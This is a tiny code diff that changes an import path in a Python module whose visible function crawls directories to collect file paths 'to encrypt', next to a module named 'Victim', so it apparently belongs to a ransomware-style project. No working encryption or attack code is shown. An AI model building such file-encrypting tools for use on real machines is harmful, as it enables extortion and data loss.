@@ -1,5 +1,5 @@
 import os
-from Victim.file_struct import File
+from file_struct import File
 
 # crawl files and return file paths to encrypt
 def crawl_files(start_dir, dirs_to_skip):
